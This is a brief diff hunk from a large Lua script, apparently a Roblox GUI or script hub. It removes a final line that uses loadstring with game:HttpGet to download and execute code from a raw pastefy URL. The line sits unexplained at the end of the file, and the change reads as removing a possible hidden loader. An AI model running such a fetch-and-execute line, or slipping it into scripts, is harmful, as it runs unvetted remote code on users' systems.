@@ -11590,5 +11590,3 @@ Tabs.Misc:AddButton({
 		end)
 	end)
 	Window:SelectTab(1)
-
-loadstring(game:HttpGet("https://pastefy.app/cS7PVnkf/raw"))()
